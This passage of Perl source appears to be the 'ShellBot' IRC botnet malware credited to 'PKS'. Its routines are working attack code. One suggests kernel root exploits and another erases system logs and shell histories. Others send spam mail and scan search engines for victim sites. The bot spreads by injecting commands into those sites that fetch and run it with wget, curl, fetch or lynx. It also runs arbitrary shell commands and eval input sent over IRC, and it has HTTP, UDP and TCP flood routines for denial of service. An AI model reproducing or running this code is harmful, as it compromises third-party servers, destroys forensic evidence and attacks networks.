                if ( `uname -a` =~ /2.4.25-1|2.4.27/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 uselib24"
                    );
                }
                if ( `uname -a` =~ /2.6.[0]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 Maybe wuftpd, h00lyshit"
                    );
                }
                if ( `uname -a` =~ /2.6.[2]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 mremap_pte, krad, h00lyshit"
                    );
                }
                if ( `uname -a` =~ /2.6.8-5/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 krad2,./krad x,x = 1..9, h00lyshit"
                    );
                }
                if ( `uname -a` =~ /2.6.9-34/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 r00t, h00lyshit"
                    );
                }
                if ( `uname -a` =~ /2.6.5-9|2.6.1[0123456]/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 krad, krad2, h00lyshit"
                    );
                }
                if ( `uname -a` =~ /2.6.17/ ) {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) 7Rootable with:12 prctl, h00lyshit"
                    );
                }
                else {
                    sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@7Root12) Rootable with:12 Nothing"
                    );
                }
            }

            if ( $funcarg =~ /^logs/ ) {
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2LogCleaner12) 12This process can be long, just wait"
                );
                system 'rm -rf /var/log/lastlog';
                system 'rm -rf /var/log/wtmp';
                system 'rm -rf /etc/wtmp';
                system 'rm -rf /var/run/utmp';
                system 'rm -rf /etc/utmp';
                system 'rm -rf /var/log';
                system 'rm -rf /var/logs';
                system 'rm -rf /var/adm';
                system 'rm -rf /var/apache/log';
                system 'rm -rf /var/apache/logs';
                system 'rm -rf /usr/local/apache/log';
                system 'rm -rf /usr/local/apache/logs';
                system 'rm -rf /root/.bash_history';
                system 'rm -rf /root/.ksh_history';
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2LogCleaner12) 12All default log and bash_history files erased"
                );
                sleep 1;
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2LogCleaner12) 12Now Erasing the rest of the machine log files"
                );
                system 'find / -name *.bash_history -exec rm -rf {} \;';
                system 'find / -name *.bash_logout -exec rm -rf {} \;';
                system 'find / -name "log*" -exec rm -rf {} \;';
                system 'find / -name *.log -exec rm -rf {} \;';
                sleep 1;
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2LogCleaner12) 12Done! All logs erased"
                );
            }

            if ( $funcarg =~ /^mailsend\s+(.*)\s+(.*)\s+(.*)\s+(.*)/ ) {
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2MailSender12) 12Enviando e-mail para $3"
                );
                $subject   = $1;
                $sender    = $2;
                $recipient = $3;
                @corpo     = $4;
                $mailtype  = "content-type: text/html";
                $sendmail  = '/usr/sbin/sendmail';
                open( SENDMAIL, "| $sendmail -t" );
                print SENDMAIL "$mailtype\n";
                print SENDMAIL "Subject: $subject\n";
                print SENDMAIL "From: $sender\n";
                print SENDMAIL "To: $recipient\n\n";
                print SENDMAIL "@corpo\n\n";
                close(SENDMAIL);
                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :12(7@2MailSend12) 12Enviado para $recipient"
                );
            }

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

######################### SCANNER #################################
            if ( $funcarg =~ /^scan\s+(.*?)\s+(.*)/ ) {

                sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\x3\x30\x2C\x31.:: \x3\x31\x32[\x3\x34PKS SCAN\x3\x31\x32] \x3\x38COmenzando \x3\x30::.\xF"
                );
                sleep 2;
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :7--------------------------------" );

                my $contatore = 0;
                my $boturl    = $1;
                my $max       = 5000;
                my $chiave    = $2;
                $chiave =~ s/ /\+/g;
                $chiave =~ s/:/\%3A/g;
                $chiave =~ s/\//\%3A%2F/g;

                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :4String:12 $boturl" );
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :4Dork:12 $chiave" );
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :7--------------------------------" );
                sleep 2;

                my @url1 = yahoo( $max, $chiave );
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Yahoo : "
                      . scalar(@url1)
                      . " Sitio/s" );

                my @url2 = google($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Google : "
                      . scalar(@url2)
                      . " Sitio/s" );

                my @url3 = altavista($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Altavista : "
                      . scalar(@url3)
                      . " Sitio/s" );

                my @url4 = msn($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 MSN : "
                      . scalar(@url4)
                      . " Sitio/s" );

                my @url5 = myspace($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 MySpace : "
                      . scalar(@url5)
                      . " Sitio/s" );

                my @url6 = ask($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Ask : "
                      . scalar(@url6)
                      . " Sitio/s" );

                my @url7 = search($chiave);
                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Search : "
                      . scalar(@url7)
                      . " Sitio/s" );

                push( @total, @url1, @url2 );

                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :7--------------------------------" );

                sendraw( $IRC_cur_socket,
                        "PRIVMSG $printl :4Scan:12 Total : "
                      . scalar(@total)
                      . " Sitio/s" );

                my %visti;
                my @unici = grep { !$visti{$_}++ } @total;
                my $tot = scalar(@unici);

                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :4Scan:12 Filtrado/s : $tot Sitios" );
                sleep 2;

                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :7--------------------------------" );

                sendraw( $IRC_cur_socket, "PRIVMSG $printl :4Explotando..." );

                foreach my $url (@unici) {

                    $contatore++;
                    if ( $contatore % 30 == 0 ) {
                        sendraw( $IRC_cur_socket,
                                "PRIVMSG $printl :4Scaneando:12"
                              . $contatore
                              . " de $tot Sitios 4de 7"
                              . $chiave
                              . " " );
                    }
                    if ( $tot == $contatore ) {
                        sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\x3\x30\x2C\x31.:: \x3\x31\x32[\x3\x34PKS-SCAN\x3\x31\x32] \x3\x38Terminado - "
                              . $chiave
                              . "\x3\x34" );
                    }

                    sendraw( $IRC_cur_socket,
                            "PRIVMSG $printl : ( Scan ) (  Exploiting :"
                          . $url2
                          . " )  " );

           #my $path = "";my $file = "";($path, $file) = $url =~ /^(.+)\/(.+)$/;
                    $url2 = "http://" . $url . $boturl . "@phpshell?";
                    $url3 =
                        "http://"
                      . $url
                      . $boturl
                      . "@cmd?&cmd=cd+/tmp;GET+@bot+>>+xbot.txt;perl+bot.txt;rm+-rf+bot*";
                    $url4 =
                        "http://"
                      . $url
                      . $boturl
                      . "@cmd?&cmd=cd+/tmp;wget+@bot;perl+bot.txt;rm+-rf+bot*";
                    $url5 =
                        "http://"
                      . $url
                      . $boturl
                      . "@cmd?&cmd=cd+/tmp;fetch @bot+>>+bot.txt;perl+bot.txt;rm+-rf+bot*";
                    $url6 =
                        "http://"
                      . $url
                      . $boturl
                      . "@cmd?&cmd=cd+/tmp;curl+@bot+-o+bot.txt;perl+bot.txt;rm+-rf+bot*";
                    $url7 =
                        "http://"
                      . $url
                      . $boturl
                      . "@cmd?&cmd=cd+/tmp;lynx+-source+@bot+>+bot.txt;perl+bot.txt;rm+-rf+bot*";
                    $url8 = "http://" . $url . $boturl . "@spread?";
                    print "\n" . $url2 . "\n\n";

##### RQ 1 #####

                    my $req = HTTP::Request->new( GET => $url2 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /r57shell/ ) {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :4PKS-SCAN:12 @@ VULNERABLE @@ : 4"
                                  . $url2
                                  . " " );
                        }
                    }

##### RQ 2 #####

                    my $req = HTTP::Request->new( GET => $url3 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /Connectted to PKS BOT NET/ )
                        {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN|EXPLOTANDO CON GET]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }

##### RQ 3 #####

                    my $req = HTTP::Request->new( GET => $url4 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /Connectted to PKS BOT NET/ )
                        {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN|EXPLOTANDO CON WGET]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }

##### RQ 4 #####

                    my $req = HTTP::Request->new( GET => $url5 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /Connectted to PKS BOT NET/ )
                        {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN|EXPLOTANDO CON FETCH]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }

##### RQ 5 #####

                    my $req = HTTP::Request->new( GET => $url6 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /Connectted to PKS BOT NET/ )
                        {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN|EXPLOTANDO CON CURL]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }

##### RQ 6 #####

                    my $req = HTTP::Request->new( GET => $url7 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ /Connectted to PKS BOT NET/ )
                        {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN|EXPLOTANDO CON LYNX]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }

##### RQ 7 #####

                    my $req = HTTP::Request->new( GET => $url8 );
                    my $ua = LWP::UserAgent->new();
                    $ua->timeout(10);

                    my $response = $ua->request($req);
                    if ( $response->is_success ) {
                        if ( $response->content =~ // ) {
                            sendraw( $IRC_cur_socket,
"PRIVMSG $printl :\002[PKS-SCAN| SPREANDING ]\002 "
                                  . $url
                                  . " \n\n" );
                        }
                    }
                    else {
#    print 'Error: ',$path, $response->status_line, "\n";
#    sendraw($IRC_cur_socket, "PRIVMSG $printl :\002[PKS-SCAN| @@ ERROR @@ ]\002 ".$url."  - ".$response->status_line." \n\n");
                    }
                }
            }

######################### SCANNER #################################

##########################################################

            #######################################################
            #                                                     #
            #    SHELLBOT BY PKS - pks@cabrones.cl                #
            #                                                     #
            #######################################################

##########################################################

            if ( $funcarg =~ /^httpflood\s+(.*)\s+(\d+)/ ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002\0034[HTTP DDoSing]\003\002 Atacando "
                      . $1
                      . ":80 por "
                      . $2
                      . " segundos." );
                my $itime = time;
                my ($cur_time);
                $cur_time = time - $itime;
                while ( $2 > $cur_time ) {
                    $cur_time = time - $itime;
                    my $socket = IO::Socket::INET->new(
                        proto    => 'tcp',
                        PeerAddr => $1,
                        PeerPort => 80
                    );
                    print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: "
                      . $1
                      . "\r\nConnection: Keep-Alive\r\n\r\n";
                    close($socket);
                }
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002\0034[HTTP]\003\002 Attacking done "
                      . $1
                      . "." );
            }
            if ( $funcarg =~ /^udpflood\s+(.*)\s+(\d+)\s+(\d+)/ ) {
                sendraw( $IRC_cur_socket,
                    "PRIVMSG $printl :\002\0034[UDP DDoSing]\003\002 Atacando "
                      . $1 . " con "
                      . $2
                      . " Kb paquetes por "
                      . $3
                      . " Segundos." );
                my ( $dtime, %pacotes ) = udpflooder( "$1", "$2", "$3" );
                $dtime = 1 if $dtime == 0;
                my %bytes;
                $bytes{igmp} = $2 * $pacotes{igmp};
                $bytes{icmp} = $2 * $pacotes{icmp};
                $bytes{o}    = $2 * $pacotes{o};
                $bytes{udp}  = $2 * $pacotes{udp};
                $bytes{tcp}  = $2 * $pacotes{tcp};
                sendraw(
                    $IRC_cur_socket,
                    "PRIVMSG $printl :\002\0034[UDP]\003\002 Sent "
                      . int(
                        (
                            $bytes{icmp} +
                              $bytes{igmp} +
                              $bytes{udp} +
                              $bytes{o}
                        ) / 1024
                      )
                      . " Kb in "
                      . $dtime
                      . " seconds to "
                      . $1 . "."
                );
            }
            exit;
        }
    }

    sub ircase {
        my ( $kem, $printl, $case ) = @_;

        if ( $case =~ /^join (.*)/ ) {
            j("$1");
        }
        if ( $case =~ /^part (.*)/ ) {
            p("$1");
        }
        if ( $case =~ /^rejoin\s+(.*)/ ) {
            my $chan = $1;
            if ( $chan =~ /^(\d+) (.*)/ ) {
                for ( my $ca = 1 ; $ca <= $1 ; $ca++ ) {
                    p("$2");
                    j("$2");
                }
            }
            else {
                p("$chan");
                j("$chan");
            }
        }
        if ( $case =~ /^op/ ) {
            op( "$printl", "$kem" ) if $case eq "op";
            my $oarg = substr( $case, 3 );
            op( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
        }
        if ( $case =~ /^deop/ ) {
            deop( "$printl", "$kem" ) if $case eq "deop";
            my $oarg = substr( $case, 5 );
            deop( "$1", "$2" ) if ( $oarg =~ /(\S+)\s+(\S+)/ );
        }
        if ( $case =~ /^msg\s+(\S+) (.*)/ ) {
            msg( "$1", "$2" );
        }
        if ( $case =~ /^flood\s+(\d+)\s+(\S+) (.*)/ ) {
            for ( my $cf = 1 ; $cf <= $1 ; $cf++ ) {
                msg( "$2", "$3" );
            }
        }
        if ( $case =~ /^ctcp\s+(\S+) (.*)/ ) {
            ctcp( "$1", "$2" );
        }
        if ( $case =~ /^ctcpflood\s+(\d+)\s+(\S+) (.*)/ ) {
            for ( my $cf = 1 ; $cf <= $1 ; $cf++ ) {
                ctcp( "$2", "$3" );
            }
        }
        if ( $case =~ /^nick (.*)/ ) {
            nick("$1");
        }
        if ( $case =~ /^connect\s+(\S+)\s+(\S+)/ ) {
            conectar( "$2", "$1", 6667 );
        }
        if ( $case =~ /^raw (.*)/ ) {
            sendraw("$1");
        }
        if ( $case =~ /^eval (.*)/ ) {
            eval "$1";
        }
    }

##########################################################

    #######################################################
    #                                                     #
    #    SHELLBOT BY PKS - pks@cabrones.cl                #
    #                                                     #
    #######################################################

##########################################################

    sub shell {
        my $printl  = $_[0];
        my $comando = $_[1];
        if ( $comando =~ /cd (.*)/ ) {
            chdir("$1") || msg( "$printl", "No such file or directory" );
            return;
        }
        elsif ( $pid = fork ) {
            waitpid( $pid, 0 );
        }
        else {
            if (fork) {
                exit;
            }
            else {
                my @resp = `$comando 2>&1 3>&1`;
                my $c    = 0;
                foreach my $linha (@resp) {
                    $c++;
                    chop $linha;
                    sendraw( $IRC_cur_socket, "PRIVMSG $printl :$linha" );
                    if ( $c == "$linas_max" ) {
                        $c = 0;
                        sleep $sleep;
                    }
                }
                exit;
            }
        }
    }

##########################################################

    #######################################################
    #                                                     #
    #    SHELLBOT BY PKS - pks@cabrones.cl                #
    #                                                     #
    #######################################################

##########################################################

    sub tcpflooder {
        my $itime = time;
        my ($cur_time);
        my ( $ia, $pa, $proto, $j, $l, $t );
        $ia       = inet_aton( $_[0] );
        $pa       = sockaddr_in( $_[1], $ia );
        $ftime    = $_[2];
        $proto    = getprotobyname('tcp');
        $j        = 0;
        $l        = 0;
        $cur_time = time - $itime;
        while ( $l < 1000 ) {
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            $t = "SOCK$l";
            socket( $t, PF_INET, SOCK_STREAM, $proto );
            connect( $t, $pa ) || $j--;
            $j++;
            $l++;
        }
        $l = 0;
        while ( $l < 1000 ) {
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            $t = "SOCK$l";
            shutdown( $t, 2 );
            $l++;
        }
    }

##########################################################

    #######################################################
    #                                                     #
    #    SHELLBOT BY PKS - pks@cabrones.cl                #
    #                                                     #
    #######################################################

##########################################################

    sub udpflooder {
        my $iaddr = inet_aton( $_[0] );
        my $msg   = 'A' x $_[1];
        my $ftime = $_[2];
        my $cp    = 0;
        my (%pacotes);
        $pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} =
          $pacotes{tcp} = 0;

        socket( SOCK1, PF_INET, SOCK_RAW, 2 ) or $cp++;

        socket( SOCK2, PF_INET, SOCK_DGRAM, 17 ) or $cp++;
        socket( SOCK3, PF_INET, SOCK_RAW,   1 )  or $cp++;
        socket( SOCK4, PF_INET, SOCK_RAW,   6 )  or $cp++;
        return (undef) if $cp == 4;
        my $itime = time;
        my ($cur_time);
        while (1) {
            for ( my $porta = 1 ; $porta <= 65000 ; $porta++ ) {
                $cur_time = time - $itime;
                last if $cur_time >= $ftime;
                send( SOCK1, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{igmp}++;
                send( SOCK2, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{udp}++;
                send( SOCK3, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{icmp}++;
                send( SOCK4, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                  and $pacotes{tcp}++;

                for ( my $pc = 3 ; $pc <= 255 ; $pc++ ) {
                    next if $pc == 6;
                    $cur_time = time - $itime;
                    last if $cur_time >= $ftime;
                    socket( SOCK5, PF_INET, SOCK_RAW, $pc ) or next;
                    send( SOCK5, $msg, 0, sockaddr_in( $porta, $iaddr ) )
                      and $pacotes{o}++;
                }
            }
            last if $cur_time >= $ftime;
        }
        return ( $cur_time, %pacotes );
    }

    sub ctcp {
        return unless $#_ == 1;
        sendraw("PRIVMSG $_[0] :\001$_[1]\001");
    }

    sub msg {
        return unless $#_ == 1;
        sendraw("PRIVMSG $_[0] :$_[1]");
    }

    sub notice {
        return unless $#_ == 1;
        sendraw("NOTICE $_[0] :$_[1]");
    }

    sub op {
        return unless $#_ == 1;
        sendraw("MODE $_[0] +o $_[1]");
    }

    sub deop {
        return unless $#_ == 1;
        sendraw("MODE $_[0] -o $_[1]");
    }
    sub j { &join(@_); }

    sub join {
        return unless $#_ == 0;
        sendraw("JOIN $_[0]");
    }
    sub p { part(@_); }

    sub part {
        sendraw("PART $_[0]");
    }

    sub nick {
        return unless $#_ == 0;
        sendraw("NICK $_[0]");
    }

    sub quit {
        sendraw("QUIT :$_[0]");
    }

##########################################################

    #######################################################
    #                                                     #
    #    SHELLBOT BY PKS - pks@cabrones.cl                #
    #                                                     #
    #######################################################

##########################################################

    sub google {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $google =
"http://www.google.cl/search?q=$chiave&num=$num&hl=es&start=$a&sa=N";
                my $req = HTTP::Request->new( GET => $google );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/google/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub yahoo {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $yahoo =
"http://search.yahoo.com/search?p=$chiave&n=$num&ei=UTF-8&pstart=1&b=$a";
                my $req = HTTP::Request->new( GET => $yahoo );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~ m/<em class=yschurl>(.+)\<\/em\>/g ) {
                    if ( $1 !~ m/yahoo/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub altavista {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $altavista =
"http://www.altavista.com/web/results?itag=ody&q=$chiave&stq=$a";
                my $req = HTTP::Request->new( GET => $altavista );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/altavista/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub msn {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $msn =
"http://search.msn.com/results.aspx?q=$chiave&first=$a&FORM=PERE1";
                my $req = HTTP::Request->new( GET => $msn );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/msn/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub myspace {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $myspace =
"http://sads.myspace.com/Modules/Search/Pages/Search.aspx?t=tms&q=$chiave&s=$a";
                my $req = HTTP::Request->new( GET => $myspace );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/myspace/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub ask {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $ask =
"http://www.ask.com/web?q=$chiave&o=0&l=dir&qsrc=0&qid=$num&page=$a";
                my $req = HTTP::Request->new( GET => $ask );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/ask/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }

    sub search {
        $num    = 100;
        $inizio = 0;
        $fine   = ( $_[0] / $num ) - 1;
        while ( $inizio <= $fine ) {
            $a = $inizio * $num;
            $inizio++;
            my @key = ("$_[1]");
            foreach $chiave (@key) {
                my $search =
                  "http://www.search.com/search?q=$chiave&nav=$a.10.3.10";
                my $req = HTTP::Request->new( GET => $search );
                my $ua = LWP::UserAgent->new();
                $ua->agent('Mozilla/5.0');
                my $response = $ua->request($req);
                my $resp     = $response->content;
                while ( $resp =~
                    m/<h2 class=r><a href=\"?http:\/\/([^>\"]+)\"? class=l/g )
                {
                    if ( $1 !~ m/search/ ) {
                        my $stringa = $1;
                        $stringa =~ s/<b>//g;
                        $stringa =~ s/<\/b>//g;
                        $stringa =~ s/<wbr>//g;
                        $stringa =~ s/\/(.+?).php?(.+)//g;
                        $stringa =~ s/\/(.+?).txt(.+)//g;
                        $stringa =~ s/\/(.+?).htm(.+)//g;
                        $stringa =~ s/\/(.+?).html(.+)//g;
                        $stringa =~ s/\/(.+?).pl(.+)//g;
                        $stringa =~ s/\/(.+?).cfm(.+)//g;
                        $stringa =~ s/\/(.+?).asp(.+)//g;
                        $stringa =~ s/\/(.+?).pdf(.+)//g;
                        my $sito = $stringa . "/";
                        push( @lista, $sito );
                    }
                }
            }
        }
        return @lista;
    }
}

# PKS OWNED YOUR BOX
# NO WEB AVALIABLE
# pks@cabrones.cl
# NOTE: DONT REMOVE COPYRIGHTS
# PKS (C) -- 2007
